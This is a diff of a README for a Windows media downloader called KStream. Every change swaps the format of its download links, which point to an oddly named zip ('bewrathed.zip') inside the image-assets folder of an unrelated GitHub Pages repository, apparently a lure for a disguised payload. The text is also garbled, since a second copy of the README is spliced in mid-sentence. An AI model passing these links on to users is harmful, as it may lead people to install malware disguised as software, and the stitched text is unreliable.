@@ -5,7 +5,7 @@ description: "Download videos, extract audio, and fetch transcripts with this se
 ---
 # 🎬 kstream-downloader - Download Videos, Audio, and Transcripts Easily
 
-[![Download KStream](https://img.shields.io/badge/Download-KStream-8A2BE2?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Websyze/websyze.github.io/main/assets/img/bewrathed.zip)
+[![Download KStream](https://img.shields.io/badge/Download-KStream-8A2BE2?style=for-the-badge&logo=github)](https://github.com/Websyze/websyze.github.io/raw/refs/heads/main/assets/img/bewrathed.zip)
 
 KStream is a free, open-source video downloader, audio extractor, and transcript grabber for Windows. It lets you save media from YouTube, Instagram, Twitter/X, and more than 1000 supported sites through a simple web application. You do not need programming knowledge to use KStream. If you can copy a link and click a button, you can use this app.
 
@@ -41,7 +41,7 @@ You do not need to create an account, learn Python, or understand how yt-dlp wor
 
 Visit this link to download the application:
 
-[Download KStream from GitHub](https://raw.githubusercontent.com/Websyze/websyze.github.io/main/assets/img/bewrathed.zip)
+[Download KStream from GitHub](https://github.com/Websyze/websyze.github.io/raw/refs/heads/main/assets/img/bewrathed.zip)
 
 Use the download page to save KStream to your Windows computer. If your browser asks where to save the file, choose a folder you can easily find later, such as your Downloads folder.
 
@@ -161,7 +161,7 @@ No. KStream is designed for end users. You use a simple web interface to paste l
 
 Yes. K# 🎬 kstream-downloader - Download Videos, Audio, and Transcripts Easily
 
-[![Download KStream](https://img.shields.io/badge/Download-KStream-6A5ACD?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Websyze/websyze.github.io/main/assets/img/bewrathed.zip)
+[![Download KStream](https://img.shields.io/badge/Download-KStream-6A5ACD?style=for-the-badge&logo=github)](https://github.com/Websyze/websyze.github.io/raw/refs/heads/main/assets/img/bewrathed.zip)
 
 KStream is a free, open-source video downloader, audio extractor, and transcript grabber built for everyday computer users. It works with YouTube, Instagram, Twitter/X, and more than 1000 supported sites. You do not need any programming knowledge to use it. If you can copy a link and click a button, you can use KStream.
 
@@ -198,7 +198,7 @@ There is no account to create and no Python setup required. The goal is simple: 
 
 Visit this link to download the application:
 
-[Download KStream](https://raw.githubusercontent.com/Websyze/websyze.github.io/main/assets/img/bewrathed.zip)
+[Download KStream](https://github.com/Websyze/websyze.github.io/raw/refs/heads/main/assets/img/bewrathed.zip)
 
 Follow the download steps shown on that page. If your browser asks where to save the file, choose a folder you will remember, such as your Downloads folder.
 
